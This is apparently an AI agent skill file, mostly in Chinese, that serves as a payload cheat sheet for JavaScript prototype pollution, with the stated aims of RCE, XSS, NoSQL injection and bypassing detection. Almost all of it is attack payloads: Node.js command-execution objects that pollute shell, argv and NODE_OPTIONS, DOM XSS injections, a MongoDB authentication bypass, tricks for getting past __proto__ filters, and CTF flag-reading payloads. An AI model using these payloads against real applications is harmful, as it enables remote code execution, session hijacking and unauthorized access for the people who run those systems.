---
name: prototype-pollution
description: Use when encountering javascript原型链污染 - rce、xss、nosql注入、绕过检测
---

# 原型链污染

## Info

- **Domain**: web
- **Tags**: web, prototype-pollution, javascript

## 基础Payload
```javascript
{"__proto__": {"admin": true}}
{"constructor.prototype": {"admin": true}}
{"__proto__": {"__proto__": {"admin": true}}}
```

## 服务端RCE (Node.js)
```javascript
// child_process
{"__proto__": {"shell": "/proc/self/exe", "argv": ["-c", "id"]}}

// 通过require
{"__proto__": {"require": "child_process"}}

// 污染环境变量
{"__proto__": {"NODE_OPTIONS": "--require=/proc/self/cmdline"}}
```

## 客户端XSS
```javascript
// DOM污染
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"src": "javascript:alert(1)"}}

// 污染表单action
{"__proto__": {"action": "javascript:alert(1)"}}
```

## NoSQL注入
```javascript
// MongoDB
{"__proto__": {"$ne": ""}}      // 不等于空
{"__proto__": {"$gt": ""}}      // 大于空
{"__proto__": {"$where": "1==1"}}

// 绕过认证
{"username": "admin", "password": {"__proto__": {"$gt": ""}}}
```

## 污染位置
```javascript
// URL参数
?__proto__[admin]=true
?constructor[prototype][admin]=true

// JSON body
{"__proto__": {"admin": true}}

// 深度合并
merge(target, JSON.parse('{"__proto__":{"admin":true}}'))

// Object.assign
Object.assign(target, JSON.parse('{"__proto__":{"admin":true}}'))
```

## 探测方法
```javascript
// 检查是否可污染
{}.__proto__.test = 1;
({}).test === 1;  // true表示可污染

// 检查constructor
{}.constructor.prototype

// 检查Object.prototype
Object.prototype.polluted = 1;
({}).polluted;  // 1
```

## 常见漏洞函数
```javascript
// 危险函数
Object.assign()
_.merge()
_.defaultsDeep()
$.extend()
JSON.parse() + merge()
recursiveMerge()
```

## 绕过过滤
```javascript
// 绕过__proto__过滤
{"constructor": {"prototype": {"admin": true}}}
{"__proto__": {"__proto__": {"admin": true}}}
{"__pro"+"to__": {"admin": true}}  // 拼接绕过

// Unicode编码
{"\u005f\u005fproto\u005f\u005f": {"admin": true}}
```

## CTF常见利用
```javascript
// 1. 污染isAdmin
{"__proto__": {"isAdmin": true}}

// 2. 污染命令执行
{"__proto__": {"shell": "cat /flag"}}

// 3. 污染文件路径
{"__proto__": {"outputFile": "/tmp/flag"}}

// 4. 绕过验证
{"__proto__": {"authenticated": true}}
```